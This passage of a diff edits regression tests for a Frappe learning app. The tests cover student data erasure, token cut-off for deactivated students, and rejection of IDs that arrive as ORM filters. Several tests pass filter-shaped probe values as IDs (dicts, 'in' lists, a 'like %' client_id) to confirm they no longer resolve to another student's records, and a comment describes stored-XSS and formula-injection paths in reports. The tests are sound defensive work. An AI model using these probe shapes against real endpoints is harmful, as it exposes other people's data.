-		self.assertFalse(os.path.exists(path_a), "her bytes must be gone, not just her row")
-		self.assertTrue(os.path.exists(path_b), "the other girl's recording must survive")
-		fname = frappe.db.get_value("File", {"attached_to_name": clip_b}, "name")
-		self.assertTrue(frappe.get_doc("File", fname).get_content())   # still streamable
-
-	def test_erasure_does_not_claw_back_a_peers_gems(self):
-		"""Deleting an XP row that a PEER earned on the erased girl's clip silently dropped
-		that peer's gem total (it is the ledger _total_gems sums) and could pull her back
-		below a belt she had already passed. The row stays; only the reference goes."""
-		girl = self._mk_student("Erase Gems Girl")
-		peer = self._mk_student("Erase Gems Peer")
-		clip = self._record(girl, b"E-gems", "erase-gems")
-		api._award_xp(peer.name, "operator_assist", 7, clip=clip, dedup_key="operator:" + clip)
-		frappe.db.commit()
-		before = api._total_gems(peer.name)
-		self.assertGreaterEqual(before, 7)
-
-		self.assertTrue(api.delete_student(girl.name).get("ok"))
-
-		self.assertEqual(api._total_gems(peer.name), before)   # she keeps every gem
-		rows = frappe.get_all("Boli XP Ledger", filters={"student": peer.name},
-		                      fields=["clip", "dedup_key", "points"])
-		self.assertEqual([r.points for r in rows], [7])
-		self.assertIsNone(rows[0].clip)                        # reference severed…
-		self.assertNotIn(clip, rows[0].dedup_key or "")        # …including in the dedup key
-
-	def test_interrupted_erasure_never_leaves_a_row_without_its_audio(self):
-		"""Filesystem deletes are not transactional. When the unlink happened inside the
-		erasure transaction, an error part-way through restored the Dialect Capture and File
-		rows while the bytes stayed gone: get_boli_queue kept offering the clip and
-		get_boli_audio raised FileNotFoundError. And the mid-way commit meant a re-run
-		answered not_found, so the mess could not be cleaned up either."""
-		girl = self._mk_student("Erase Interrupt Girl")
-		clip = self._record(girl, b"E-int", "erase-int")
-		frappe.db.commit()
-		path = self._audio_path(clip)
-		real = api._release_capture_refs        # runs after her clip + File rows are deleted
-
-		def boom(*a, **kw):
-			raise RuntimeError("injected mid-erasure failure")
-		api._release_capture_refs = boom
-		self.addCleanup(lambda: setattr(api, "_release_capture_refs", real))
-		try:
-			api.delete_student(girl.name)
-			self.fail("the injected failure should have propagated")
-		except RuntimeError:
-			frappe.db.rollback()
-		api._release_capture_refs = real
-
-		self.assertTrue(frappe.db.exists("Dialect Capture", clip), "rows rolled back")
-		fname = frappe.db.get_value("File", {"attached_to_name": clip}, "name")
-		self.assertTrue(fname)
-		self.assertTrue(frappe.get_doc("File", fname).get_content(),
-		                "a surviving row's audio must still be readable")
-		self.assertTrue(os.path.exists(path))
-		# and the job is still finishable
-		self.assertTrue(api.delete_student(girl.name).get("ok"))
-		self.assertFalse(frappe.db.exists("Dialect Capture", clip))
-		self.assertFalse(os.path.exists(path))
-
-	def test_a_clip_whose_owner_is_gone_is_neither_offered_nor_streamed(self):
-		"""Defence in depth: `dc.student != me` and `c.student == student` both PASS for a
-		dangling owner id, so an orphan left by any code path that removes a Student was
-		still handed to — and streamed to — a live classmate."""
-		owner = self._mk_student("Erase Orphan Owner")
-		worker = self._mk_student("Erase Orphan Worker")
-		scribe = self._mk_student("Erase Orphan Scribe")
-		clip = self._record(owner, b"E-orph", "erase-orph")
-		frappe.db.set_value("Dialect Capture", clip, "captured_on", "2019-01-01 00:00:00",
-		                    update_modified=False)          # oldest → first in the queue order
-		frappe.db.commit()
-		path = self._audio_path(clip)
-
-		def _rm_clip():
-			# her Student row is raw-deleted below, so _mk_student's cleanup cannot find her:
-			# erase her voice trail by id, or the orphan-backfill patch's tests inherit it
-			paths = api._erase_boli_data(owner.name)
-			frappe.db.delete("Boli Transcription", {"clip": clip})
-			frappe.db.delete("File", {"attached_to_name": clip})
-			frappe.db.delete("Dialect Capture", {"name": clip})
-			frappe.db.commit()
-			api._erase_capture_bytes(paths + [path])
-		self.addCleanup(_rm_clip)
-
-		tok = api._token_for(worker.name)
-		# baseline: while her owner exists the clip IS work, at every stage
-		q = api.get_boli_queue(student=worker.name, token=tok, kind="transcribe", batch=20)
-		self.assertIn(clip, [i["clip"] for i in q["items"]], "baseline: offered to transcribe")
-		frappe.db.set_value("Dialect Capture", clip, {"claimed_by": None, "claim_expires": None},
-		                    update_modified=False)          # drop the lease it just took…
-		frappe.get_doc({"doctype": "Boli Transcription", "clip": clip, "author": scribe.name,
-		                "text": "ओकर बोली", "version": 1}).insert(ignore_permissions=True)
-		frappe.db.set_value("Dialect Capture", clip, "status", "in_verification",
-		                    update_modified=False)          # …so only the owner check can exclude it
-		frappe.db.commit()
-		q = api.get_boli_queue(student=worker.name, token=tok, kind="verify", batch=20)
-		self.assertIn(clip, [i["clip"] for i in q["items"]], "baseline: offered to verify")
-		frappe.local.response = frappe._dict()
-		api.get_boli_audio(student=worker.name, token=tok, clip=clip)
-		self.assertTrue(frappe.local.response.get("filecontent"), "baseline: audio streams")
-
-		frappe.db.delete("Student", {"name": owner.name})   # orphan it, NOT via delete_student
-		frappe.db.commit()
-
-		q = api.get_boli_queue(student=worker.name, token=tok, kind="verify", batch=20)
-		self.assertNotIn(clip, [i["clip"] for i in q["items"]])
-		frappe.local.response = frappe._dict()
-		r = api.get_boli_audio(student=worker.name, token=tok, clip=clip)
-		self.assertEqual(r, {"ok": False, "error": "not_found"})
-		self.assertFalse(frappe.local.response.get("filecontent"))
-		frappe.db.set_value("Dialect Capture", clip, "status", "recorded", update_modified=False)
-		q = api.get_boli_queue(student=worker.name, token=tok, kind="transcribe", batch=20)
-		self.assertNotIn(clip, [i["clip"] for i in q["items"]])
+		out = api.delete_student(girl.name)
+		self.assertTrue(out.get("ok"), out)
+		self.assertTrue(out.get("resumed"))
+		self.assertFalse(api._erasure_residue(girl.name))
 
 	def test_erasure_scrubs_the_plaintext_name_residue(self):
 		""""ALL her data" includes Frappe's own bookkeeping. Its delete feed writes
@@ -1375,15 +800,18 @@ class TestErasure(FrappeTestCase):
 		own cleanup can never match it), a cascaded Notification Settings is archived in
 		Deleted Document as JSON, and a DefaultValue stays keyed on her user id."""
 		girl = self._mk_student("Erase Residue Girl", with_user=True)
-		clip = self._record(girl, b"E-res", "erase-res")
-		speaker = frappe.db.get_value("Dialect Capture", clip, "speaker")
-		api._notify_facilitators("bell naming " + girl.student_name, "Dialect Capture", clip)
+		doubt = frappe.get_doc({"doctype": "Lesson Doubt", "student": girl.name,
+		                        "student_name": girl.student_name, "track": "t1",
+		                        "lesson": "l1", "activity": "learn", "question": "मदद",
+		                        "resolved": 0, "raised_on": frappe.utils.now()
+		                        }).insert(ignore_permissions=True)
+		api._notify_facilitators("bell naming " + girl.student_name, "Lesson Doubt", doubt.name)
 		frappe.db.commit()
 		user = girl.user
 
 		self.assertTrue(api.delete_student(girl.name).get("ok"))
 
-		for ident in (girl.name, speaker, clip):
+		for ident in (girl.name, doubt.name):
 			self.assertFalse(frappe.get_all("Comment", filters={
 				"comment_type": "Deleted", "subject": ("like", "%" + ident)}, limit=1),
 				"delete-feed comment still names " + ident)
@@ -1391,7 +819,7 @@ class TestErasure(FrappeTestCase):
 		                                filters={"deleted_name": user}, limit=1))
 		self.assertFalse(frappe.get_all("DefaultValue", filters={"parent": user}, limit=1))
 		self.assertFalse(frappe.get_all("Notification Log",
-		                                filters={"document_name": clip}, limit=1))
+		                                filters={"document_name": doubt.name}, limit=1))
 		self.assertFalse(frappe.get_all("DocShare", filters={"user": user}, limit=1))
 
 
@@ -1633,8 +1061,7 @@ class TestRateLimitKeyAndWindow(FrappeTestCase):
 	def test_limiter_outage_refuses_signup_but_not_a_lesson_write(self):
 		"""The availability call: a Redis outage must not brick a classroom on 2G, so only
 		the destructive PRE-AUTH paths fail closed. Signup (mints a Student + a 90-day
-		token) and dialect capture (writes audio to disk) are refused; the girl's lesson
-		writes still land."""
+		token) is refused; the girl's lesson writes still land."""
 		from unittest.mock import patch
 
 		def _rm():
@@ -1642,7 +1069,6 @@ class TestRateLimitKeyAndWindow(FrappeTestCase):
 			frappe.db.delete("Lesson Attempt", {"client_id": "t-avail-att"})
 			for s in frappe.get_all("Student", filters={"student_name": (
 					"in", ["Outage Lesson Girl", "Outage Signup Girl"])}, pluck="name"):
-				frappe.db.delete("Dialect Capture", {"student": s})
 				frappe.db.delete("Student", {"name": s})
 			frappe.db.commit()
 
@@ -1651,14 +1077,9 @@ class TestRateLimitKeyAndWindow(FrappeTestCase):
 		                      "active": 1, "gender": "Other"}).insert(ignore_permissions=True)
 		tok = api._token_for(stu.name)
 		frappe.db.commit()
-		wav = b"RIFF$\x00\x00\x00WAVEfmt " + b"\x00" * 32
 		with patch.object(api, "_rl_cache", side_effect=RuntimeError("redis down")):
 			frappe.local._hikmat_rl_warned = False
 			signup = api.signup_student(name="Outage Signup Girl", pin="1234")
-			frappe.local._hikmat_rl_warned = False
-			capture = api._save_dialect_capture(wav, "audio/wav", student=stu.name, token=tok,
-			                                    track="t", lesson="l", duration_secs=5,
-			                                    client_id="t-avail-cap")
 			frappe.local._hikmat_rl_warned = False
 			event = api.log_event(student=stu.name, token=tok, kind="dwell", duration_secs=9,
 			                      track="t", lesson="l", activity="word",
@@ -1670,7 +1091,6 @@ class TestRateLimitKeyAndWindow(FrappeTestCase):
 		frappe.local._hikmat_rl_warned = False
 		self.assertEqual(signup.get("error"), "rate_limited")       # fail CLOSED
 		self.assertFalse(frappe.db.exists("Student", {"student_name": "Outage Signup Girl"}))
-		self.assertEqual(capture.get("error"), "rate_limited")      # fail CLOSED (outbox retries)
 		self.assertTrue(event.get("ok"), event)                     # fail OPEN — she keeps learning
 		self.assertTrue(attempt.get("ok"), attempt)
 
@@ -1702,12 +1122,10 @@ class TestRateLimitKeyAndWindow(FrappeTestCase):
 
 
 class TestDeactivatedStudent(FrappeTestCase):
-	"""M1: `active` is the facilitator's offboarding lever, but only submit_dialect_capture
-	checked it — so a deactivated girl's cached token still worked for up to 90 days:
-	boli_home returned her private stats and get_boli_queue handed her peers' clips. The
-	check now lives in the shared auth path, so every endpoint inherits it."""
-
-	WAV = b"RIFF$\x00\x00\x00WAVEfmt " + b"\x00" * 32
+	"""M1: `active` is the facilitator's offboarding lever, but only one endpoint
+	checked it — so a deactivated girl's cached token still worked for up to 90 days on
+	every other endpoint. The check now lives in the shared auth path, so all of them
+	inherit it."""
 
 	def _mk_student(self, name, with_user=False):
 		user = None
@@ -1720,15 +1138,6 @@ class TestDeactivatedStudent(FrappeTestCase):
 
 		def _rm():
 			for s in frappe.get_all("Student", filters={"student_name": name}, pluck="name"):
-				clips = frappe.get_all("Dialect Capture", filters={"student": s}, pluck="name")
-				for cap in clips:
-					frappe.db.delete("File", {"attached_to_doctype": "Dialect Capture",
-					                          "attached_to_name": cap})
-				frappe.db.delete("Boli XP Ledger", {"student": s})
-				frappe.db.delete("Boli Speaker", {"student": s})
-				frappe.db.sql("update `tabDialect Capture` set claimed_by=null, "
-				              "claim_expires=null where claimed_by=%s", s)
-				frappe.db.delete("Dialect Capture", {"student": s})
 				frappe.db.delete("Learning Event", {"student": s})
 				frappe.db.delete("Lesson Attempt", {"student": s})
 				frappe.db.delete("Student", {"name": s})
@@ -1744,49 +1153,33 @@ class TestDeactivatedStudent(FrappeTestCase):
 	def test_deactivating_a_student_cuts_off_her_device(self):
 		girl, gtok = self._mk_student("Switched Off Girl")
 		peer, ptok = self._mk_student("Still On Girl")
-		clip = api._save_dialect_capture(self.WAV + b"m1", "audio/wav", student=peer.name,
-		                                 token=ptok, track="boli-t", lesson="l1",
-		                                 duration_secs=9, client_id="t-m1-clip")["id"]
 		frappe.db.commit()
-		# baseline: while active she is a full participant
-		self.assertIn("mine", api.boli_home(student=girl.name, token=gtok))
+		# baseline: while active her cached token is accepted everywhere
 		self.assertTrue(api._authorized(girl.name, gtok))
+		self.assertTrue(api.submit_attempt(student=girl.name, token=gtok, track="t",
+		                                   lesson="l", activity="word", stars=1,
+		                                   client_id="t-m1-att0").get("ok"))
 
 		frappe.db.set_value("Student", girl.name, "active", 0, update_modified=False)
 		frappe.db.commit()
-		frappe.local.response.pop("filecontent", None)   # a stale value from another test
-		                                                 # must not mask a real leak below
 
 		self.assertFalse(api._authorized(girl.name, gtok))   # shared auth path refuses her
 		self.assertFalse(api._token_ok(girl.name, gtok))     # ...even the raw token check
-		# her own private stats are gone from the Boli tab (the meter stays: it is public)
-		home = api.boli_home(student=girl.name, token=gtok)
-		self.assertTrue(home.get("ok"))
-		self.assertNotIn("mine", home)
-		# and she gets no more of her classmates' recordings, at either stage
-		for kind in ("transcribe", "verify"):
-			self.assertEqual(api.get_boli_queue(student=girl.name, token=gtok,
-			                                    kind=kind).get("error"), "auth")
-		self.assertEqual(api.get_boli_audio(student=girl.name, token=gtok,
-		                                    clip=clip).get("error"), "auth")
-		self.assertEqual(api.submit_transcription(student=girl.name, token=gtok, clip=clip,
-		                                          text="नहीं", client_id="t-m1-tx"
-		                                          ).get("error"), "auth")
-		self.assertEqual(api.submit_verification(student=girl.name, token=gtok, clip=clip,
-		                                         verdict="accept", client_id="t-m1-vf"
-		                                         ).get("error"), "auth")
-		self.assertIsNone(frappe.local.response.get("filecontent"))   # nothing was streamed
-		# the lesson endpoints already screened `active`; they must keep saying so, because
+		# the lesson endpoints screen `active` themselves and must keep saying so, because
 		# the client treats unknown_student as PERMANENT (drop) and auth as "re-login" —
-		# both stop the device, neither leaves a clip spinning in the outbox forever.
+		# both stop the device, neither leaves a write spinning in the outbox forever.
 		self.assertEqual(api.submit_attempt(student=girl.name, token=gtok, track="t",
 		                                    lesson="l", activity="word", stars=1,
 		                                    client_id="t-m1-att").get("error"),
 		                 "unknown_student")
-		self.assertEqual(api._save_dialect_capture(self.WAV, "audio/wav", student=girl.name,
-		                                           token=gtok, track="t", lesson="l",
-		                                           duration_secs=5, client_id="t-m1-cap"
-		                                           ).get("error"), "unknown_student")
+		self.assertEqual(api.log_event(student=girl.name, token=gtok, kind="dwell",
+		                               duration_secs=5, track="t", lesson="l",
+		                               activity="word", client_id="t-m1-ev").get("error"),
+		                 "unknown_student")
+		# and her progress stops being readable with that token at all
+		self.assertEqual(api.get_progress(student=girl.name, token=gtok), {"progress": {}})
+		# nothing about the deactivation touched the girl still on the roster
+		self.assertTrue(api._authorized(peer.name, ptok))
 
 	def test_deactivated_online_session_no_longer_resolves(self):
 		"""The session twin of the same hole: an ONLINE learner authenticates by her live
@@ -1802,7 +1195,7 @@ class TestDeactivatedStudent(FrappeTestCase):
 		frappe.db.commit()
 		self.assertIsNone(api._session_student())
 		self.assertFalse(api._authorized(girl.name, None))
-		self.assertNotIn("mine", api.boli_home())
+		self.assertEqual(api.get_progress(), {"progress": {}})
 
 
 class TestDocNameCoercion(FrappeTestCase):
@@ -1812,26 +1205,12 @@ class TestDocNameCoercion(FrappeTestCase):
 	never named, bypassing the queue's own-clip / already-seen exclusions. Doc-name params
 	are now coerced to scalars (or rejected)."""
 
-	WAV = b"RIFF$\x00\x00\x00WAVEfmt " + b"\x00" * 32
 
 	def _mk_student(self, name):
 		def _rm():
 			for s in frappe.get_all("Student", filters={"student_name": name}, pluck="name"):
-				clips = frappe.get_all("Dialect Capture", filters={"student": s}, pluck="name")
-				for cap in clips:
-					frappe.db.delete("File", {"attached_to_doctype": "Dialect Capture",
-					                          "attached_to_name": cap})
-				if clips:
-					frappe.db.delete("Boli Verification", {"clip": ["in", clips]})
-					frappe.db.delete("Boli Transcription", {"clip": ["in", clips]})
-					frappe.db.delete("Boli XP Ledger", {"clip": ["in", clips]})
-				frappe.db.delete("Boli Verification", {"verifier": s})
-				frappe.db.delete("Boli Transcription", {"author": s})
-				frappe.db.delete("Boli XP Ledger", {"student": s})
-				frappe.db.delete("Boli Speaker", {"student": s})
-				frappe.db.sql("update `tabDialect Capture` set claimed_by=null, "
-				              "claim_expires=null where claimed_by=%s", s)
-				frappe.db.delete("Dialect Capture", {"student": s})
+				frappe.db.delete("Learning Event", {"student": s})
+				frappe.db.delete("Lesson Attempt", {"student": s})
 				frappe.db.delete("Student", {"name": s})
 			frappe.db.commit()
 
@@ -1848,64 +1227,63 @@ class TestDocNameCoercion(FrappeTestCase):
 		            True, False, None, b"abc", object()):
 			self.assertEqual(api._docname(bad), "", repr(bad))
 
-	def test_dict_clip_is_rejected_instead_of_resolving(self):
-		rec, rtok = self._mk_student("Filter Probe Rec")
-		txr, ttok = self._mk_student("Filter Probe Txr")
+	def test_dict_ids_are_rejected_instead_of_resolving(self):
+		"""The proven exploit shape: name no document, hand the server a FILTER and let it
+		choose one. It was found on an endpoint that has since been removed, but the
+		primitive is generic — every whitelisted argument arrives as
+		parsed JSON, so a dict reaching frappe.db.get_value/exists is an ORM filter. These
+		are the surviving sinks; a regression here is another IDOR."""
+		girl, gtok = self._mk_student("Filter Probe Girl")
 		probe_a, ptok = self._mk_student("Filter Probe Attacker")
-		clip = api._save_dialect_capture(self.WAV + b"m3", "audio/wav", student=rec.name,
-		                                 token=rtok, track="boli-t", lesson="l1",
-		                                 duration_secs=9, client_id="t-m3-clip")["id"]
-		api.submit_transcription(student=txr.name, token=ttok, clip=clip, text="कहाँ जात बाड़ू",
-		                         client_id="t-m3-tx")
-		self.assertEqual(frappe.db.get_value("Dialect Capture", clip, "status"),
-		                 "in_verification")
-		frappe.local.response.pop("filecontent", None)
-		# the proven exploit: name no clip, hand the server a filter and let it choose one
-		for probe in ({"status": "in_verification"}, ["in", [clip]], {"name": clip}):
+		api.submit_attempt(student=girl.name, token=gtok, track="t", lesson="l",
+		                   activity="word", stars=3, client_id="t-m3-att")
+		frappe.db.commit()
+
+		self.addCleanup(lambda: (frappe.db.delete("Learning Event",
+		                                          {"client_id": ("like", "t-m3-ev%")}),
+		                         frappe.db.commit()))
+		for i, probe in enumerate(({"active": 1}, ["in", [girl.name]], {"name": girl.name})):
 			with self.subTest(repr(probe)):
-				self.assertEqual(api.get_boli_audio(student=probe_a.name, token=ptok,
-				                                    clip=probe).get("error"), "not_found")
-				self.assertEqual(api.submit_transcription(student=probe_a.name, token=ptok,
-				                                          clip=probe, text="चोरी",
-				                                          client_id="t-m3-p1").get("error"),
-				                 "not_found")
-				self.assertEqual(api.submit_verification(student=probe_a.name, token=ptok,
-				                                         clip=probe, verdict="accept",
-				                                         client_id="t-m3-p2").get("error"),
-				                 "not_found")
-		self.assertIsNone(frappe.local.response.get("filecontent"))   # no audio was streamed
-		self.assertEqual(frappe.db.count("Boli Transcription", {"author": probe_a.name}), 0)
-		self.assertEqual(frappe.db.count("Boli Verification", {"verifier": probe_a.name}), 0)
-		# and the clip is untouched: no vote was recorded against it either
-		self.assertEqual(frappe.db.get_value("Dialect Capture", clip, "status"),
-		                 "in_verification")
+				# reads: no id named → falls through to "no student", never her row
+				self.assertEqual(api.get_progress(student=probe, token=gtok), {"progress": {}})
+				# an authenticated write is refused outright
+				self.assertEqual(api.submit_attempt(student=probe, token=ptok, track="t",
+				                                    lesson="l", activity="word", stars=3,
+				                                    client_id="t-m3-p1").get("error"),
+				                 "unknown_student")
+				# log_event ALLOWS guests, so the coerced-away id is not an error — it is a
+				# row attributed to NOBODY. That is the property that matters: the filter
+				# must never resolve to a real girl and file her classmate's event as hers.
+				ev = api.log_event(student=probe, token=ptok, kind="dwell", duration_secs=5,
+				                   track="t", lesson="l", activity="word",
+				                   client_id="t-m3-ev%d" % i)
+				self.assertTrue(ev.get("ok"), ev)
+				self.assertIsNone(frappe.db.get_value("Learning Event", ev["name"], "student"))
+		# her trail is exactly what she recorded — no probe wrote against her
+		self.assertEqual(frappe.db.count("Lesson Attempt", {"student": girl.name}), 1)
+		self.assertEqual(frappe.db.count("Learning Event", {"student": girl.name}), 0)
+		self.assertEqual(frappe.db.count("Lesson Attempt", {"student": probe_a.name}), 0)
 
 	def test_container_valued_ids_cannot_widen_a_lookup(self):
-		rec, rtok = self._mk_student("Filter Probe Rec2")
-		txr, ttok = self._mk_student("Filter Probe Txr2")
-		clip = api._save_dialect_capture(self.WAV + b"m3b", "audio/wav", student=rec.name,
-		                                 token=rtok, track="boli-t", lesson="l1",
-		                                 duration_secs=9, client_id="t-m3b-clip")["id"]
-		# client_id is a dedup FILTER value, so a list there is an ORM operator spec and
-		# would hand back someone else's row as a "dedup" hit
-		api.submit_transcription(student=txr.name, token=ttok, clip=clip, text="ठीक बा",
-		                         client_id="t-m3b-tx")
-		r = api.submit_transcription(student=txr.name, token=ttok, clip=clip, text="फिर",
-		                             client_id=["like", "%"])
-		self.assertFalse(r.get("dedup"))               # did NOT match a stranger's row
-		self.assertEqual(r.get("error"), "not_available")   # it fell through to the real check
-		self.assertEqual(frappe.db.count("Boli Transcription", {"clip": clip}), 1)
-		# student / operator reach frappe.db.exists and a Link write; a dict must not pass
-		self.assertEqual(api.boli_home(student={"active": 1}, token=rtok).get("mine"), None)
-		self.assertEqual(api.get_boli_queue(student={"active": 1}, token=rtok,
-		                                    kind="verify").get("error"), "unknown_student")
-		bad = api._save_dialect_capture(self.WAV + b"m3c", "audio/wav", student=rec.name,
-		                                token=rtok, track="boli-t", lesson="l1",
-		                                duration_secs=9, operator={"active": 1},
-		                                client_id="t-m3b-op")
-		self.assertTrue(bad.get("ok"), bad)
-		self.assertIsNone(frappe.db.get_value("Dialect Capture", bad["id"], "operator"))
+		"""client_id is a dedup FILTER value, so a list there is an ORM operator spec and
+		would hand back a STRANGER's row as this girl's "dedup" hit — an answer the client
+		then treats as "already saved" and drops."""
+		girl, gtok = self._mk_student("Filter Widen Girl")
+		peer, ptok = self._mk_student("Filter Widen Peer")
+		first = api.submit_attempt(student=girl.name, token=gtok, track="t", lesson="l",
+		                           activity="word", stars=2, client_id="t-m3b-att")
+		self.assertTrue(first.get("ok"), first)
+		frappe.db.commit()
 
+		r = api.submit_attempt(student=peer.name, token=ptok, track="t", lesson="l",
+		                       activity="word", stars=1, client_id=["like", "%"])
+		self.assertFalse(r.get("dedup"))              # did NOT match the other girl's row
+		self.assertTrue(r.get("ok"), r)               # it fell through and saved her own
+		self.assertNotEqual(r.get("name"), first.get("name"))
+		self.assertEqual(frappe.db.count("Lesson Attempt", {"student": girl.name}), 1)
+		self.assertEqual(frappe.db.count("Lesson Attempt", {"student": peer.name}), 1)
+		# the coerced client_id is stored as NULL rather than as the container's repr
+		self.assertIsNone(frappe.db.get_value("Lesson Attempt", r["name"], "client_id"))
 
 class TestStaffOnlyEndpoints(FrappeTestCase):
 	"""The destructive / credential-bearing endpoints are STAFF-ONLY, and
@@ -2176,164 +1554,15 @@ class TestLoginStudentIsOneStudent(FrappeTestCase):
 
 
 # ---------------------------------------------------------------------------
-# Backfill regression (audit 2026-07-28): the v9 patch. `delete_student` erases the
-# whole Boli trail, but only for deletions made AFTER that fix shipped — every site
-# that ran an older build still holds the voice of girls whose Student row is long
-# gone. The patch is the only thing that reaches that data, so it is tested here.
-# ---------------------------------------------------------------------------
-# imported here rather than in the header so this whole block stays contiguous
-from hikmat.patches import v9_erase_orphan_boli  # noqa: E402
-
-
-class TestOrphanBoliBackfill(FrappeTestCase):
-	"""Reproduces the pre-fix state on purpose: insert Boli rows, then delete ONLY the
-	Student (the way an old build did), leaving `student` pointing at nothing. Frappe
-	Links carry no FK constraint, so the audio stays queryable and on disk."""
-
-	HEAD = b"RIFF$\x00\x00\x00WAVEfmt " + b"\x00" * 32
-
-	def _mk_student(self, name):
-		def _rm():
-			paths = []
-			for s in frappe.get_all("Student", filters={"student_name": name}, pluck="name"):
-				paths += api._erase_boli_data(s)
-				frappe.delete_doc("Student", s, force=1, ignore_permissions=True,
-				                  delete_permanently=True)
-			frappe.db.commit()
-			# unlink our own bytes explicitly: the directory sweep skips anything younger
-			# than min_age_secs, so a test that leaned on it would leave audio behind
-			api._erase_capture_bytes(paths)
-		self.addCleanup(_rm)
-		return frappe.get_doc({"doctype": "Student", "student_name": name, "active": 1,
-		                       "gender": "Female"}).insert(ignore_permissions=True)
-
-	def _record(self, stu, tail, cid, **kw):
-		r = api._save_dialect_capture(self.HEAD + tail, "audio/wav", student=stu.name,
-		                              token=api._token_for(stu.name), track="boli-t",
-		                              lesson="l1", duration_secs=9, client_id=cid, **kw)
-		self.assertTrue(r.get("ok"), r)
-		return r["id"]
-
-	def _audio_path(self, clip):
-		url = frappe.db.get_value("Dialect Capture", clip, "audio_file")
-		return os.path.join(frappe.utils.get_files_path(is_private=1), url.rsplit("/", 1)[-1])
-
-	def _orphan(self, student):
-		"""Delete the Student row and nothing else — exactly what the old build did."""
-		frappe.delete_doc("Student", student, force=1, ignore_permissions=True,
-		                  delete_permanently=True)
-		frappe.db.commit()
-
-	def test_patch_erases_orphaned_voice_and_spares_living_owners(self):
-		gone = self._mk_student("Orphan Gone Girl")
-		alive = self._mk_student("Orphan Alive Girl")
-		hers = self._record(gone, b"O-gone", "orphan-gone")
-		theirs = self._record(alive, b"O-alive", "orphan-alive", operator=gone.name)
-		# a stale transcription lease held by the girl who is about to vanish: without
-		# the patch this clip re-enters the transcribe queue owned by a ghost
-		frappe.db.set_value("Dialect Capture", theirs,
-		                    {"claimed_by": gone.name, "claim_expires": frappe.utils.now()},
-		                    update_modified=False)
-		frappe.get_doc({"doctype": "Boli Transcription", "clip": theirs, "author": gone.name,
-		                "text": "भागल लइकी के लिखल", "version": 1}).insert(ignore_permissions=True)
-		frappe.db.commit()
-		gone_audio, alive_audio = self._audio_path(hers), self._audio_path(theirs)
-		self.assertTrue(os.path.exists(gone_audio))
-
-		self._orphan(gone.name)
-		# the pre-patch reality: her voice is still there, owned by nobody
-		self.assertTrue(frappe.db.exists("Dialect Capture", hers))
-		self.assertIn(gone.name, v9_erase_orphan_boli._dangling_students())
-
-		v9_erase_orphan_boli.execute()
-		frappe.db.commit()
-
-		self.assertFalse(frappe.db.exists("Dialect Capture", hers))
-		self.assertEqual(frappe.db.count("Boli Transcription", {"author": gone.name}), 0)
-		self.assertEqual(frappe.db.count("Boli XP Ledger", {"student": gone.name}), 0)
-		self.assertEqual(frappe.db.count("Boli Speaker", {"student": gone.name}), 0)
-		self.assertEqual(frappe.db.count("File", {"attached_to_name": hers}), 0)
-		self.assertFalse(os.path.exists(gone_audio))        # the bytes, not just the row
-		# the living girl's recording survives, with the ghost's references released
-		self.assertTrue(frappe.db.exists("Dialect Capture", theirs))
-		self.assertTrue(os.path.exists(alive_audio))
-		row = frappe.db.get_value("Dialect Capture", theirs,
-		                          ["student", "operator", "claimed_by", "claim_expires"],
-		                          as_dict=True)
-		self.assertEqual(row.student, alive.name)
-		self.assertFalse(row.operator)
-		self.assertFalse(row.claimed_by)                    # lease back in the queue
-		self.assertFalse(row.claim_expires)
-		self.assertEqual(v9_erase_orphan_boli._dangling_students(), [])
-
-	def test_patch_is_idempotent_and_a_noop_on_a_clean_site(self):
-		alive = self._mk_student("Orphan Noop Girl")
-		clip = self._record(alive, b"O-noop", "orphan-noop")
-		frappe.db.commit()
-		audio = self._audio_path(clip)
-
-		def snap():
-			return ({dt: frappe.db.count(dt) for dt in api._BOLI_DOCTYPES},
-			        os.path.exists(audio))
-
-		before = snap()
-		for _ in range(3):                                  # re-runnable, per the docstring
-			v9_erase_orphan_boli.execute()
-			frappe.db.commit()
-		self.assertEqual(snap(), before)                    # nothing dangled, nothing moved
-		self.assertTrue(frappe.db.exists("Dialect Capture", clip))
-
-	def test_dangling_speaker_links_are_cleared(self):
-		"""Force-deleting a Boli Speaker cannot cascade, so a clip can be left pointing at
-		a speaker row that is gone; the export/curation paths must never resolve one."""
-		alive = self._mk_student("Orphan Speaker Girl")
-		clip = self._record(alive, b"O-spk", "orphan-spk")
-		speaker = frappe.db.get_value("Dialect Capture", clip, "speaker")
-		self.assertTrue(speaker)
-		frappe.delete_doc("Boli Speaker", speaker, force=1, ignore_permissions=True,
-		                  delete_permanently=True)
-		frappe.db.commit()
-		self.assertEqual(frappe.db.get_value("Dialect Capture", clip, "speaker"), speaker)
-
-		v9_erase_orphan_boli.execute()
-		frappe.db.commit()
-
-		self.assertFalse(frappe.db.get_value("Dialect Capture", clip, "speaker"))
-		self.assertTrue(frappe.db.exists("Dialect Capture", clip))   # owner still alive
-
-	def test_hot_path_columns_are_indexed(self):
-		"""M6: `get_boli_queue` was type=ALL + filesort on a table designed to grow without
-		bound, and the erasure UPDATEs took a table-wide lock. These indexes are the fix —
-		a future 'unused index' cleanup must fail here, not in production."""
-		expected = {
-			"Dialect Capture": {"student", "operator", "status", "claimed_by",
-			                    "claim_expires", "captured_on", "consent_status"},
-			"Boli Transcription": {"clip", "author"},
-			"Boli Verification": {"clip", "verifier", "transcription"},
-			"Boli XP Ledger": {"student", "clip"},
-			"Boli Speaker": {"student"},
-			"Lesson Attempt": {"student"},
-		}
-		for doctype, columns in expected.items():
-			leading = set(frappe.db.sql("""
-				select column_name from information_schema.statistics
-				where table_schema = database() and table_name = %s and seq_in_index = 1""",
-				"tab" + doctype, pluck=True))
-			self.assertTrue(columns <= leading,
-			                "%s missing index on %s" % (doctype, sorted(columns - leading)))
-
-
-# ---------------------------------------------------------------------------
 # Round-2 security regressions (audit 2026-07-28).
 #
-# The stored-XSS / spreadsheet-formula-injection primitive was NOT confined to the
-# Boli queue: learner-authored text reaches Desk "Data" columns in five sibling
+# The stored-XSS / spreadsheet-formula-injection primitive was NOT confined to one
+# report: learner-authored text reaches Desk "Data" columns in five sibling
 # facilitator reports, frappe's Data formatter returns it unchanged and
 # frappe-datatable assigns it with innerHTML, while the same rows are what the
 # CSV/XLSX export writes. These tests pin all of it, plus the two regressions the
-# first (Boli-only) fix introduced — an entity-mangled corpus export and a
-# transcription truncated at 120 characters — and the erasure hole that let
-# single_center() leave a deleted girl's audio in her peers' queues.
+# first, single-report fix introduced — an entity-mangled export — and the erasure
+# hole that let single_center() leave a deleted girl's rows behind.
 #
 # Appended as ONE class at the end of the file on purpose: it minimises merge
 # collisions with the other hardening work landing in this file.
